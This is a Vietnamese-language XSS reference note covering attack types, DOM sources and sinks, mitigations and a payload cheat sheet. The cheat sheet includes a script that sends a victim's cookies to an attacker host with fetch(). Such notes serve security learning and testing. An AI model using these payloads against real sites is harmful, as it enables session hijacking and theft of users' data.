# ⚡ Cross-Site Scripting (XSS)

## 1. 📌 Tổng quan & Phân loại
XSS xảy ra khi ứng dụng web nhận dữ liệu không an toàn từ người dùng và đưa trực tiếp vào trang web mà không qua validation hoặc output encoding, cho phép kẻ tấn công thực thi mã JavaScript độc hại trên trình duyệt của nạn nhân.

### 3 Loại XSS chính:
1. **Reflected XSS:** Payload nằm trong request (URL, parameter) và được phản hồi ngay lập tức trong response.
2. **Stored XSS:** Payload được lưu trữ vĩnh viễn trong database/server (bình luận, profile name) và kích hoạt mỗi khi người dùng truy cập trang có chứa dữ liệu đó.
3. **DOM-based XSS:** Lỗ hổng nằm hoàn toàn ở client-side JavaScript, khi dữ liệu từ một Source (VD: `location.search`, `document.referrer`) đi vào một Sink nguy hiểm (VD: `innerHTML`, `document.write`, `eval`).

---

## 2. 🔍 Sources & Sinks (DOM XSS)

### Common Sources:
- `location.search`, `location.hash`, `location.pathname`
- `document.referrer`, `document.cookie`
- `window.name`, `postMessage`

### Common Sinks:
- **HTML Sinks:** `element.innerHTML`, `element.outerHTML`, `document.write()`, `document.writeln()`
- **Execution Sinks:** `eval()`, `Function()`, `setTimeout()`, `setInterval()`
- **URL Sinks:** `location.href`, `location.replace()`, `window.open()`, `element.src`
- **jQuery Sinks:** `$()`, `$.html()`, `$.append()`

---

## 3. 💣 Cheat Sheet & Common Payloads

### Basic Payloads:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<body onload=alert(1)>
```

### Context Breaking:
- **Inside input tag:** `"><script>alert(1)</script>` hoặc `" onfocus=alert(1) autofocus="`
- **Inside JavaScript string:** `'-alert(1)-'` hoặc `';alert(1)//` hoặc `</script><script>alert(1)</script>`
- **Template Literals:** `${alert(1)}`

### Stealing Cookies / Session Hijacking:
```html
<script>
fetch('https://attacker-collaborator.com/?cookie=' + encodeURIComponent(document.cookie));
</script>
```

---

## 4. 🛡️ Biện pháp phòng chống (Mitigation)
1. **Context-aware Output Encoding:** Encode dữ liệu tương ứng với context (HTML Body, HTML Attribute, JavaScript variable, CSS, URL).
2. **Content Security Policy (CSP):** Thiết lập CSP chặt chẽ, vô hiệu hóa `unsafe-inline` và `eval`.
3. **HttpOnly Cookies:** Ngăn chặn JavaScript đọc các cookie nhạy cảm (Session ID).
